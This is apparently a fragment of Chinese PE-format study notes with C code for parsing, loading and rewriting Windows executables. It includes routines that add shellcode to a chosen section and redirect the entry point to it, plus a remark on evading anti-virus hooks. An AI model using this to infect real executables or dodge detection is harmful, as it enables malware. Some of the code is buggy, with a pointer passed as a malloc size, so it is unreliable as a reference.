shellcode.\tpImageOptionalHeader-&gt;AddressOfEntryPoint = shellCodeRVA;\treturn TRUE;&#125;12345678910#pragma once#include &lt;Windows.h&gt;/* 函数功能：依次打印节的序号、名字以及是否具备可执行属性，让用户选择哪个节来添加shellcode input参数： pSectionHeader：该PE文件的节表指针 numberOfSections：PE文件的节数量 返回值：用户选择的第几个节*/int ChooseSectionToAddShellCode(const PIMAGE_SECTION_HEADER pSectionHeader, const DWORD numberOfSections);1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465#include &lt;stdio.h&gt;#include &quot;ChooseSectionToAddShellCode.h&quot;#pragma warning(disable:4996) //disable warning of unsafe function scanfint ChooseSectionToAddShellCode(const PIMAGE_SECTION_HEADER pSectionHeader, const DWORD numberOfSections)&#123;\t//输出各个节表的Name，以及是否可执行\tPIMAGE_SECTION_HEADER pTempImageSectionHeader = pSectionHeader; //遍历节表用的\tfor (int i = 0; i &lt; numberOfSections; i++, pTempImageSectionHeader++)\t&#123; //输出Name，确保节名称占用8个字符宽度 char SectionName[9]; //节名称最大8个字符 + 1个空字符 strncpy(SectionName, (const char*)pTempImageSectionHeader-&gt;Name, 8); SectionName[8] = &#x27;\\0&#x27;; // 确保字符串以空字符结尾 // 输出是否可执行，并且对输出做对齐处理 BOOL isExecutable = (pSectionHeader[i].Characteristics &amp; IMAGE_SCN_MEM_EXECUTE) != 0; printf(&quot; %d: %-10s Executable: %s &quot;, i, SectionName, isExecutable ? &quot;Yes&quot; : &quot;No&quot;); //printf(&quot; %d: &quot;, i); ////输出Name //int j = 0; //const char* pName = (char*)pTempImageSectionHeader-&gt;Name; //while (*pName &amp;&amp; j &lt; 7) //&#123; //\tprintf(&quot;%c&quot;, *pName); //\tpName++; //\tj++; //&#125; //// 输出是否可执行 //BOOL isExecutable = (pSectionHeader[i].Characteristics &amp; IMAGE_SCN_MEM_EXECUTE) != 0; //printf(&quot; Executable: %-8s&quot;, isExecutable ? &quot;Yes&quot; : &quot;No&quot;); //printf(&quot; &quot;);\t&#125;\t//输入及错误检查\tint chosenSection = -1;\tBOOL validInput = FALSE;\twhile (!validInput) &#123; printf(&quot;Enter the section number to add the shellcode to (0 to %d): &quot;, numberOfSections - 1); if (scanf(&quot;%d&quot;, &amp;chosenSection) == 1) &#123; // 确保读取到一个整数 if (chosenSection &gt;= 0 &amp;&amp; chosenSection &lt; numberOfSections) &#123; validInput = TRUE; // 输入有效 &#125; else &#123; printf(&quot;Invalid section number. Please try again. &quot;); &#125; &#125; else &#123; // 清除错误的输入 while (getchar() != &#x27; &#x27;); printf(&quot;Invalid input. Please enter a number. &quot;); &#125;\t&#125;\treturn chosenSection;&#125;1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859#pragma once#include &lt;Windows.h&gt;#include &lt;stdlib.h&gt; //size_t#include &lt;stdio.h&gt;/* 函数功能：获取文件大小 input参数： pFile：FILE*类型 实现原理：移动文件指针到文件尾，通过ftell获得文件大小 返回值：文件大小*/size_t GetFileSize(FILE* pFile);/* 函数功能：将一个文件读取到malloc分配的内存中，返回在内存中的首地址 input参数： filepath：文件路径 output参数： length：返回文件长度 返回值：该文件在内存中的首地址*/void* ReadFileToFileBuffer(const char* filepath, size_t* length);/* 函数功能：将FileBuffer拉伸为ImageBuffer input参数： pBuffer：指向FileBuffer首地址的指针 output参数： SizeOfImageBuffer：返回ImageBuffer的大小，即SizeOfImage的值 返回值： 成功，返回ImageBuffer首地址指针 失败，返回NULL*/void* FileBufferToImageBuffer(const char* pBuffer, DWORD* SizeOfImageBuffer);/* 函数功能：将ImageBuffer压缩为NewFileBuffer input参数： pBuffer：指向ImageBuffer首地址的指针 output参数： SizeOfImageBuffer：返回NewFileBuffer的大小，在函数中用SizeOfHeaders+所有节.SizeOfRawData算出来的 返回值： 成功，返回NewFileBuffer首地址指针 失败，返回NULL*/void* ImageBufferToNewFileBuffer(const char* pBuffer, DWORD* SizeOfNewFileBuffer);/* 函数功能：将内存中pdata起始，size个字节的数据存到磁盘文件pOutputFilePath中 input参数： pdata：内存首地址 size： 大小（字节） output参数： pOutputFilePath：输出的文件路径 返回值：1表示成功，0表示失败*/BOOL MemoryToFile(const char* pdata, size_t size, const char* pOutputFilePath);123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221#include &quot;Global.h&quot;#include &lt;Windows.h&gt;#include &lt;stdio.h&gt;#pragma warning(disable:4996) //disable warning of unsafe function fopensize_t GetFileSize(FILE* pFile)&#123;\tsize_t file_size;\t// 定位到文件末尾\tif (fseek(pFile, 0, SEEK_END) != 0)\t&#123; perror(&quot;Error seeking to end of file&quot;); return -1;\t&#125;\t// 获取文件大小\tfile_size = ftell(pFile);\tif (file_size == -1L)\t&#123; perror(&quot;Error getting file size&quot;); return -1;\t&#125;\t//rewind(pFile); //也可以，也是回到文件开头\t// 回到文件开头，后面要用fread读文件的内容\tif (fseek(pFile, 0, SEEK_SET) != 0)\t&#123; perror(&quot;Error seeking to start of file&quot;); fclose(pFile); return -1;\t&#125;\treturn file_size;&#125;void* ReadFileToFileBuffer(const char* filepath, size_t* length)&#123;\tFILE* pFile;\tvoid* buffer; // 接malloc返回值\tsize_t file_size; // 接文件大小\t// 打开文件\tpFile = fopen(filepath, &quot;rb&quot;);\tif (pFile == NULL)\t&#123; perror(&quot;Error opening file&quot;); return NULL;\t&#125;\t// 获取文件大小\tfile_size = GetFileSize(pFile);\tif (file_size == -1)\t&#123; printf(&quot;Error getting the size of this file&quot;); fclose(pFile); return NULL;\t&#125;\t//// 定位到文件末尾\t//if (fseek(pFile, 0, SEEK_END) != 0)\t//&#123;\t// perror(&quot;Error seeking to end of file&quot;);\t// fclose(pFile);\t// return NULL;\t//&#125;\t//// 获取文件大小\t//file_size = ftell(pFile);\t//if (file_size == -1L)\t//&#123;\t// perror(&quot;Error getting file size&quot;);\t// fclose(pFile);\t// return NULL;\t//&#125;\t//// 回到文件开头，后面要用fread读文件的内容\t//if (fseek(pFile, 0, SEEK_SET) != 0)\t//&#123;\t// perror(&quot;Error seeking to start of file&quot;);\t// fclose(pFile);\t// return NULL;\t//&#125;\t// 分配内存\tbuffer = malloc(file_size);\tif (buffer == NULL)\t&#123; perror(&quot;Error allocating memory&quot;); fclose(pFile); return NULL;\t&#125;\t// fread是从当前文件指针开始读取\t// 读取文件内容到内存\tif (fread(buffer, 1, file_size, pFile) != file_size)\t&#123; perror(&quot;Error reading file into memory&quot;); free(buffer); fclose(pFile); return NULL;\t&#125;\t// 关闭文件\tfclose(pFile);\t// 如果需要，返回文件大小\tif (length != NULL)\t&#123; *length = file_size;\t&#125;\t// 返回内存缓冲区的指针\treturn buffer;&#125;void* FileBufferToImageBuffer(const char* pBuffer, DWORD* SizeOfImageBuffer)&#123;\t//DOS头\tPIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pBuffer;\t//PE头\tPIMAGE_NT_HEADERS32 pImageNTHeaders32 = (PIMAGE_NT_HEADERS32)((DWORD)pDosHeader + pDosHeader-&gt;e_lfanew);\t//标准PE头\tPIMAGE_FILE_HEADER pImageFileHeader = (PIMAGE_FILE_HEADER)((DWORD)pImageNTHeaders32 + 4);\t//扩展PE头\tPIMAGE_OPTIONAL_HEADER32 pImageOptionalHeader = (PIMAGE_OPTIONAL_HEADER32)((DWORD)pImageFileHeader + IMAGE_SIZEOF_FILE_HEADER);\t//节表\tPIMAGE_SECTION_HEADER pImageSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD)pImageOptionalHeader + pImageFileHeader-&gt;SizeOfOptionalHeader);\t*SizeOfImageBuffer = pImageOptionalHeader-&gt;SizeOfImage; //存SizeOfImage的值\tvoid* ImageBuffer;\tImageBuffer = malloc((size_t)SizeOfImageBuffer); //按SizeOfImage申请大小\tif (ImageBuffer == NULL)\t&#123; perror(&quot;Error allocating memory for ImageBuffer&quot;); return NULL;\t&#125;\tmemset(ImageBuffer, 0, (size_t)SizeOfImageBuffer); //填充0\t//分块拷贝\t//1、拷SizeOfHeaders\tmemcpy(ImageBuffer, pBuffer, pImageOptionalHeader-&gt;SizeOfHeaders);\t//2、循环拷节数据\tfor (int i = 0; i &lt; pImageFileHeader-&gt;NumberOfSections; i++)\t&#123; memcpy((void*)((DWORD)ImageBuffer + pImageSectionHeader[i].VirtualAddress), (void*)((DWORD)pBuffer + pImageSectionHeader[i].PointerToRawData), pImageSectionHeader[i].SizeOfRawData);\t&#125;\treturn ImageBuffer;&#125;void* ImageBufferToNewFileBuffer(const char* pBuffer, DWORD* SizeOfNewFileBuffer)&#123;\t//DOS头\tPIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pBuffer;\t//PE头\tPIMAGE_NT_HEADERS32 pImageNTHeaders32 = (PIMAGE_NT_HEADERS32)((DWORD)pDosHeader + pDosHeader-&gt;e_lfanew);\t//标准PE头\tPIMAGE_FILE_HEADER pImageFileHeader = (PIMAGE_FILE_HEADER)((DWORD)pImageNTHeaders32 + 4);\t//扩展PE头\tPIMAGE_OPTIONAL_HEADER32 pImageOptionalHeader = (PIMAGE_OPTIONAL_HEADER32)((DWORD)pImageFileHeader + IMAGE_SIZEOF_FILE_HEADER);\t//节表\tPIMAGE_SECTION_HEADER pImageSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD)pImageOptionalHeader + pImageFileHeader-&gt;SizeOfOptionalHeader);\t//计算NewFileBuffer大小，为malloc分空间做准备\t*SizeOfNewFileBuffer = 0;\t*SizeOfNewFileBuffer += pImageOptionalHeader-&gt;SizeOfHeaders; //+SizeOfHeaders\tfor (int i = 0; i &lt; pImageFileHeader-&gt;NumberOfSections; i++) //依次+SizeOfRawData\t&#123; *SizeOfNewFileBuffer += pImageSectionHeader[i].SizeOfRawData;\t&#125;\tvoid* NewFileBuffer;\tNewFileBuffer = malloc((size_t)*SizeOfNewFileBuffer); //按*SizeOfNewFileBuffer申请大小\tif (NewFileBuffer == NULL)\t&#123; perror(&quot;Error allocating memory for ImageBuffer&quot;); return NULL;\t&#125;\tmemset(NewFileBuffer, 0, (size_t)*SizeOfNewFileBuffer); //填充0\t//分块拷贝\t//1、拷SizeOfHeaders\tmemcpy(NewFileBuffer, pBuffer, pImageOptionalHeader-&gt;SizeOfHeaders);\t//2、循环拷节数据\tfor (int i = 0; i &lt; pImageFileHeader-&gt;NumberOfSections; i++)\t&#123; memcpy((void*)((DWORD)NewFileBuffer + pImageSectionHeader[i].PointerToRawData), (void*)((DWORD)pBuffer + pImageSectionHeader[i].VirtualAddress), pImageSectionHeader[i].SizeOfRawData);\t&#125;\treturn NewFileBuffer;&#125;BOOL MemoryToFile(const char* pdata, size_t size, const char* pOutputFilePath)&#123;\tFILE* pFile;\t//打开文件，以二进制，可写 打开\tpFile = fopen(pOutputFilePath, &quot;wb&quot;);\tif (pFile == NULL)\t&#123; perror(&quot;Error opening file for writing&quot;); return 0;\t&#125;\t//写入文件\tif (fwrite(pdata, 1, size, pFile) != size)\t&#123; perror(&quot;Error writing data to file&quot;); fclose(pFile); return 0;\t&#125;\tfclose(pFile);\treturn 1;&#125; 测试 对fg添加shellcodeVitrualSize>SizeOfRawData，无法添加shellcode（fg的Section好像即使没执行权限也可以执行，没找其他exe接着验证了） 代码区，添加shellcode成功。先弹窗后执行fg .data区，没执行权限。添加shellcode成功。先弹窗后执行fg"},{"title":"绑定导入表","path":"/wiki/PE/绑定导入表.html","content":"前言 如果一个exe的IAT表在加载前已经提前替换为导入函数的函数地址，那么系统加载器在加载这个exe时就能免去IAT表替换工作，加快PE加载速度，这就是绑定导入。但提前绑定是基于以下两点前提的： 需要的dll都能加载到它默认的基址中，没有发生重定位 提前绑定之后，dll输出表中引用的符号没有发生变化（比如这个dll更新了，引用的符号，函数地址就可能发生变化。提前绑定好的值此时就是不正确的了） 提前绑定是一个好主意的，当系统加载器加载一个已经绑定好的exe，会检查是否需要重新绑定： 不需要重新替换，PE加载速度是加快了的 需要重新替换，那就重新进行IAT表中的地址替换工作 如何检查： 已绑定地址的是否有效 导入dll的时间戳与绑定时的时间戳是否一致（即现在导入的dll是否和绑定时的dll一样，现在导入的dll是否有更新） dll是否重定位了 绑定导入表指出了绑定的信息，通过这张表系统加载器可以得知提前绑定了哪些dll，是否需要替换IAT表（通过对比时间戳得知导入的dll是否有更新）。 绑定导入表 从拓展PE头.数据目录表数据的第12个成员得到绑定导入表的起始地址（这个值是RVA）和大小。 1234typedef struct _IMAGE_DATA_DIRECTORY &#123; DWORD VirtualAddress; DWORD Size;&#125; IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY; 将RVA转为FOA后，找过去，是绑定导入数据的起始位置。 系统文件的绑定导入数据在文件中的存放位置：大部分情况下，该数据存储在PE文件头部，紧跟在节表之后 绑定导入数据以一个IMAGE_BOUND_IMPORT_DESCRIPTOR（IBID）结构体类型的数组开始。 123456typedef struct _IMAGE_BOUND_IMPORT_DESCRIPTOR &#123; DWORD TimeDateStamp; // 绑定时那个dll中的时间戳 WORD OffsetModuleName; // 导入的dll的名称 WORD NumberOfModuleForwarderRefs; // 该dll还依赖几个dll，有几个后面就有几个IMAGE_BOUND_FORWARDER_REF结构// Array of zero or more IMAGE_BOUND_FORWARDER_REF follows&#125; IMAGE_BOUND_IMPORT_DESCRIPTOR, *PIMAGE_BOUND_IMPORT_DESCRIPTOR; TimeDateStamp：导入dll的一个时间戳。 系统加载器通过OffsetModuleName得到导入的dll名，通过比对这个导入dll文件中标准PE头.TimeDateStamp和IBID结构.TimeDateStamp来得知导入的dll是否有更新，时间戳一样就是配对的。 OffsetModuleName：一个指向以’\\0’结尾的ASCII字符串的偏移。 这个字符串是导入dll名称。 这个偏移是相对于第一个IBID结构体基址的值，既不是RVA，也不是FOA。后面所有OffsetModuleName字段的偏移全都是相对于第一个IBID结构体基址的偏移。 NumberOfModuleForwarderRefs：紧跟着IBID结构体后还有几个IMAGE_BOUND_FORWARDER_REF结构体。 IMAGE_BOUND_FORWARDER_REF结构体和IBID结构体一样，为了统一格式，这个结构体中最后的WORD类型成员保留。 12345typedef struct _IMAGE_BOUND_FORWARDER_REF &#123; DWORD TimeDateStamp; // 绑定时那个dll中的时间戳 WORD OffsetModuleName; // 导入的dll的名称 WORD Reserved; // 保留&#125; IMAGE_BOUND_FORWARDER_REF, *PIMAGE_BOUND_FORWARDER_REF; IMAGE_BOUND_IMPORT_DESCRIPTOR结构后跟着是IMAGE_BOUND_FORWARDER_REF结构体，这样设计的目的是为了描述这种情况：exe中需要导入A.dll，而A.dll需要导入A1.dll。IMAGE_BOUND_IMPORT_DESCRIPTOR描述A.dll，紧跟着的向前引用IMAGE_BOUND_FORWARDER_REF用于描述A1.dll。 综上，绑定导入数据的组织方式如下图： IMAGE_BOUND_IMPORT_DESCRIPTOR结构后跟着是它的向前引用数组（如果有的话） 绑定导入数据结构图成员展开版绑定导入表图示（详细版） 去除绑定导入表的内容不会影响程序的正常运行。 去除方法：将绑定导入数据清0，将数据目录表中的Bound import的RVA和Size清0。 打印绑定导入表 123456789101112131415161718192021222324252627282930313233343536373839VOID PEManipulator::PrintBoundImportTable()&#123; auto pBoundImportDirectory = (PIMAGE_BOUND_IMPORT_DESCRIPTOR)GetDataDirectoryPointer(IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT); if (!pBoundImportDirectory) &#123; return; &#125; int index = 1; //第几个IBID结构 auto dwBaseBoundImportDirectory = (DWORD)pBoundImportDirectory; while (pBoundImportDirectory-&gt;OffsetModuleName) //重要成员不为0 &#123; printf(&quot; %d. BoundImportDescriptor: &quot;, index); printf(&quot; TimeDateStamp: 0x%08X &quot;, pBoundImportDirectory-&gt;TimeDateStamp); printf(&quot; OffsetModuleName: 0x%04X (\\&quot;%s\\&quot;) &quot;, pBoundImportDirectory-&gt;OffsetModuleName, (PCHAR)(dwBaseBoundImportDirectory + pBoundImportDirectory-&gt;OffsetModuleName)); printf(&quot; NumberOfModuleForwarderRefs: 0x%04X &quot;, pBoundImportDirectory-&gt;NumberOfModuleForwarderRefs); // 遍历前向引用数组 for (int j = 1; j &lt;= pBoundImportDirectory-&gt;NumberOfModuleForwarderRefs; j++) //至少为1，才执行循环体 &#123; auto pBoundREF = (PIMAGE_BOUND_FORWARDER_REF)pBoundImportDirectory + j; //PIMAGE_BOUND_FORWARDER_REF结构和IBID大小一样，通过指针运算指过去 printf(&quot; %d. ModuleForwarderReference: &quot;, j); printf(&quot; TimeDateStamp: 0x%08X &quot;, pBoundREF-&gt;TimeDateStamp); printf(&quot; OffsetModuleName: 0x%04X (\\&quot;%s\\&quot;) &quot;, pBoundREF-&gt;OffsetModuleName, (PCHAR)(dwBaseBoundImportDirectory + pBoundREF-&gt;OffsetModuleName)); printf(&quot; Reserved: 0x%04X &quot;, pBoundREF-&gt;Reserved); &#125; printf(&quot; &quot;); //下一个绑定导入表 pBoundImportDirectory += pBoundImportDirectory-&gt;NumberOfModuleForwarderRefs + 1; // 数量 + 1 指针运算操作 ++index; &#125;&#125;"},{"title":"编程练习","path":"/wiki/PE/编程练习_PE.html","content":"mark：代码参考https://bbs.kanxue.com/thread-252795.htm 模拟PE Loarder的拉伸 函数 功能 输入 输出 FileToFileBuffer 为磁盘上的文件创建文件内存映像，操作文件就像操作内存变量或内存数据一样方便 磁盘上的文件 FileBuffer FileBufferToImageBuffer 将FileBuffer拉伸 FileBuffer ImageBuffer ImageBufferToNewFileBuffer 将ImageBuffer压缩回去 ImageBuffer NewFileBuffer MemoryToFile 将内存中的数据存盘 内存中的buffer 磁盘上的文件 内核重载内核也是一个程序，很多杀软或游戏公司会对这个内核程序下钩子做检测。如果你不想跟这些钩子做对抗，可以自己将磁盘上的内核程序拉伸到内存，然后使用内核中的函数。懒人做法是完全拉伸，这可能会被检测到。实际情况中，要用到内核中哪块内容，将二进制扣出来放到自己的代码中按需使用。 FileToFileBuffer 将记事本的.exe文件读取到内存，并返回读取后在内存中的地址 过程打开文件得到文件的大小（fopen读取文件到内存，fseek让文件指针移动到文件末尾，ftell获取文件大小）malloc申请内存fread把文件中的内容读取到内存中返回内存编号fopen打开的模式：t：以文本模式打开；b：以二进制模式打开r：只读fread：fread函数，第二个参数size指定了每个要读取的元素的字节大小，第三个参数nmemb指定了要读取的元素个数。函数的返回值是成功读取的元素个数。通常，按照单字节元素来读取文件更常见，因为这样可以简单地计算出读取了多少字节；而在处理二进制文件时，通常不关心更大的元素大小。 写法一1234567// 读取1个元素，每个元素的大小为 file_size 字节// 返回结果和1比较// 如果没有读取到1个这样的元素，则不执行if语句if (fread(buffer, file_size, 1, file) != 1)&#123; ...&#125; 写法二1234567// 读取file_size个元素，每个元素的大小为1字节// 返回结果和file_size比较// 如果没有读取到file_size个这样的元素，则不执行if语句if (fread(buffer, 1, file_size, file) != file_size)&#123; ...&#125; 函数声明函数实现1234567891011#include &lt;stdlib.h&gt; // 包含size_t的定义/* 函数功能：将一个文件读取到malloc分配的内存中，返回在内存中的首地址 input参数： filepath：文件路径 output参数： length：返回文件长度 返回值：该文件在内存中的首地址*/void* ReadFileToFileBuffer(const char* filepath, size_t* length);1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374#include &lt;stdio.h&gt; //perror fopen fseek ftell fclose#include &lt;stdlib.h&gt; //malloc free size_t#include &quot;ReadFileToFileBuffer.h&quot;void *ReadFileToFileBuffer(const char *filepath, size_t *length)&#123; FILE *pFile; void *buffer; //接malloc返回值 size_t file_size; // 打开文件 pFile = fopen(filepath, &quot;rb&quot;); if (pFile == NULL) &#123; perror(&quot;Error opening file&quot;); return NULL; &#125; // 定位到文件末尾 if (fseek(pFile, 0, SEEK_END) != 0) &#123; perror(&quot;Error seeking to end of file&quot;); fclose(pFile); return NULL; &#125; // 获取文件大小 file_size = ftell(pFile); if (file_size == -1L) &#123; perror(&quot;Error getting file size&quot;); fclose(pFile); return NULL; &#125; // 回到文件开头，后面要用fread读文件的内容 if (fseek(pFile, 0, SEEK_SET) != 0) &#123; perror(&quot;Error seeking to start of file&quot;); fclose(pFile); return NULL; &#125; // 分配内存 buffer = malloc(file_size); if (buffer == NULL) &#123; perror(&quot;Error allocating memory&quot;); fclose(pFile); return NULL; &#125; // fread是从当前文件指针开始读取 // 读取文件内容到内存 if (fread(buffer, 1, file_size, pFile) != file_size) &#123; perror(&quot;Error reading file into memory&quot;); free(buffer); fclose(pFile); return NULL; &#125; // 关闭文件 fclose(pFile); // 如果需要，返回文件大小 if (length != NULL) &#123; *length = file_size; &#125; // 返回内存缓冲区的指针 return buffer;&#125;测试函数main1234567891011121314151617181920212223#include &quot;ReadFileToFileBuffer.h&quot;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt; // 显式包含stdlib.h以使用free和size_t#define FILE_PATH &quot;C:\\\\WINDOWS\\\\system32\\ otepad.exe&quot;int main()&#123; size_t length; void *FileBuffer = ReadFileToFileBuffer(FILE_PATH, &amp;length); if (FileBuffer != NULL) &#123; // 在这里使用file_data指针访问文件内容 // ... printf(&quot;address of this file: %p &quot;, FileBuffer); // 使用完毕后，释放内存 free(FileBuffer); &#125; return 0;&#125; MemoryToFile 将内存中的数据存储到磁盘的文件中(.exe格式) 过程fopen打开的模式：b：以二进制模式打开w：可写函数声明函数实现1234567891011121314#pragma once#include &lt;Windows.h&gt;#include &lt;stdlib.h&gt; //size_t/* 函数功能：将内存中pdata起始，size个字节的数据存到磁盘文件pOutputFilePath中 input参数： pdata：内存首地址 size： 大小（字节） output参数： pOutputFilePath：输出的文件路径 返回值：1表示成功，0表示失败*/BOOL MemoryToFile(const char* pdata, size_t size, const char* pOutputFilePath);1234567891011121314151617181920212223242526272829#include &quot;MemoryToFile.h&quot;#include &lt;stdio.h&gt;#pragma warning(disable:4996) //disable warning of unsafe function fopenBOOL MemoryToFile(const char* pdata, size_t size, const char* pOutputFilePath)&#123;\tFILE* pFile;\t//打开文件，以二进制，可写 打开\tpFile = fopen(pOutputFilePath, &quot;wb&quot;);\tif (pFile == NULL)\t&#123; perror(&quot;Error opening file for writing&quot;); return 0;\t&#125;\t//写入文件\tif (fwrite(pdata, 1, size, pFile) != size)\t&#123; perror(&quot;Error writing data to file&quot;); fclose(pFile); return 0;\t&#125;\tfclose(pFile);\treturn 1;&#125;测试函数main先调用ReadFileToFileBuffer将fg.exe读到FileBuffer中，然后调用MemoryBufferToFile将FileBuffer存为fg2.exe。因为没做修改，对比两个文件MD5，是一样的12345678910111213141516171819202122232425262728293031#include &quot;ReadFileToFileBuffer.h&quot;#include &quot;MemoryToFile.h&quot;#include &lt;stdio.h&gt; //printf perror#include &lt;stdlib.h&gt; //size_t free#define INPUT_FILE_PATH &quot;E:\\\\temp\\\\fg.exe&quot;#define OUTPUT_FILE_PATH &quot;E:\\\\temp\\\\fg2.exe&quot;int main()&#123; //将文件读入内存，创建文件内存映像 size_t length; void* FileBuffer = ReadFileToFileBuffer(INPUT_FILE_PATH, &amp;length); if ( NULL == FileBuffer ) &#123; printf(&quot;ReadFileToFileBuffer failed &quot;); return 0; &#125; //将内存中的数据写到文件中 if (!MemoryToFile((char*)FileBuffer, length, OUTPUT_FILE_PATH)) &#123; printf(&quot;MemoryToFile failed &quot;); fclose((FILE*)FileBuffer); return 0; &#125; free(FileBuffer); return 0;&#125; FileBufferToImageBuffer 将FileBuffer拉伸为ImageBuffer 做完这道题的启发： 对磁盘上PE文件到内存的拉伸，不止是对齐值差异会导致拉伸，那些因含有未初始化数据（如.bss节，或.bss已合并到.data节中）导致出现VitrualSize&gt;SizeOfRawData的节，也会导致拉伸。 申请空间时按SizeOfImage的大小申请。那么可以推导出SizeOfImage的大小要≥最后一个节.VirtualAddress+max{Misc,SizeOfRawData}按内存对齐后的值，要不申请的空间大小是错的。 从FileBuffer将节数据拷到ImageBuffer是按SizeOfRawData来拷，而不是max{Misc,SizeOfRawData}，原因有二： 未初始化数据要在内存占用的空间，编译器编译时已算好了，体现在VirtualAddress上了。 如果按max{Misc,SizeOfRawData}拷，可能会因为当前这个节的Misc太大，而拷到下一个节的数据。 ImageBuffer离PE文件真正运行的状态还差一些工作，具体是啥我目前不清楚。 想到傀儡进程创建一个挂起态的进程，然后修改content，修改eip，恢复执行。这个创建了挂起态做了哪些事就很耐人寻味，反正这题的拉伸只是最基础的拉伸工作。 综上，FileBuffer和ImageBuffer的区别是： FileBuffer的各个节数据从PointerToRawData开始 ImageBuffer的各个节数据从VirtualAddress开始 这个区别要作为测试判定依据来确认代码是否写对。 过程根据SizeOfImage的大小，开辟一块缓冲区(ImageBuffer)，填充为0分块拷贝从FileBuffer拷SizeOfHeaders（DOS头+PE头+节表+填充）-&gt;ImageBuffer用节表中的字段循环拷贝各个节数据从FileBuffer+节.PointerToRawData拷贝节.SizeOfRawData大小-&gt;ImageBuffer + 节.VirtualAddress思考误区1：如何填充间隙思考误区来源：之前是以学习的视角从低地址到高地址看待PE（磁盘上和内存中）里面的内容PE FileIn MemoryMZ头MZ头DOS块DOS块PE标识PE标识标准PE头标准PE头扩展PE头扩展PE头节表节表填充间隙填充间隙节表一的数据填充间隙填充间隙节表一的数据节表二的数据填充间隙填充间隙填充间隙节表n的数据节表二的数据填充间隙填充间隙填充间隙节表n的数据填充间隙填充间隙申请完SizeOfImage的空间，将SizeofHeaders从FileBuffer拷贝到ImageBuffer后就会想如何填充与节表一的数据之间的间隙。但实际上，申请空间后，先整块填充为0，后面就只用考虑拷有数据的部分，而不用单独考虑末尾填充0的问题。思考误区2：FileAlignment和SectionnAlignment相等，是否能直接复制一份FileBuffer然后返回思考误区来源：以为FileAlignment和SectionnAlignment一样，ImageBuffer大小就和FileBuffer大小一样。实际上，在FileAlignment和SectionnAlignment相等的情况下，那些含有未初始化数据导致Misc&gt;SizeOfRawData的节，也会导致拉伸。之前还想着看情况分类讨论：FileAlignment和SectionnAlignment是否相等FileAlignment==SectionnAlignment，说明ImageBuffer和FileBuffer一样，不用拉伸，直接整块拷贝FileAlignment！=SectionnAlignment，需要将FileBuffer分块拷贝1234567891011121314151617181920212223242526272829303132333435363738394041424344454647#include &quot;FileBufferToImageBuffer.h&quot;#include &lt;Windows.h&gt;void* FileBufferToImageBuffer(const char* pBuffer, const size_t length)&#123;\t//DOS头\tPIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pBuffer;\t//PE头\tPIMAGE_NT_HEADERS32 pImageNTHeaders32 = (PIMAGE_NT_HEADERS32)((DWORD)pDosHeader + pDosHeader-&gt;e_lfanew);\t//标准PE头\tPIMAGE_FILE_HEADER pImageFileHeader = (PIMAGE_FILE_HEADER)((DWORD)pImageNTHeaders32 + 4);\t//扩展PE头\tPIMAGE_OPTIONAL_HEADER32 pImageOptionalHeader = (PIMAGE_OPTIONAL_HEADER32)((DWORD)pImageFileHeader + IMAGE_SIZEOF_FILE_HEADER);\t//节表\tPIMAGE_SECTION_HEADER pImageSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD)pImageOptionalHeader + pImageFileHeader-&gt;SizeOfOptionalHeader);\tvoid* ImageBuffer; ImageBuffer = malloc(pImageOptionalHeader-&gt;SizeOfImage); //FileAlignmtn==SectionnAlignment时，考虑到可能出现SizeOfImage比FileBuffer大小大的情况，按SizeOfImage申请大小，然后然后整块拷贝 //FileAlignmtn！=SectionnAlignment时，按SizeOfImage申请大小\tif (ImageBuffer == NULL)\t&#123; perror(&quot;Error allocating memory for ImageBuffer&quot;); return NULL;\t&#125;\tmemset(ImageBuffer, 0, pImageOptionalHeader-&gt;SizeOfImage); //填充0\t//将FileBuffer拉伸为ImageBuffer，两种情况\tif (pImageOptionalHeader-&gt;FileAlignment== pImageOptionalHeader-&gt;SectionAlignment)\t//FileAlignmtn==SectionnAlignment，直接拷贝\t&#123; memcpy(ImageBuffer, pBuffer, length);\t&#125;\telse //FileAlignmtn!=SectionnAlignment，分块拷贝\t&#123; //1、拷SizeOfHeaders memcpy(ImageBuffer, pBuffer, pImageOptionalHeader-&gt;SizeOfHeaders); //2、循环拷节数据 for (int i = 0; i &lt; pImageFileHeader-&gt;NumberOfSections; i++) &#123; memcpy((void*)((DWORD)ImageBuffer + pImageSectionHeader[i].VirtualAddress), (void*)((DWORD)pBuffer + pImageSectionHeader[i].PointerToRawData), pImageSectionHeader[i].SizeOfRawData); &#125;\t&#125;\treturn 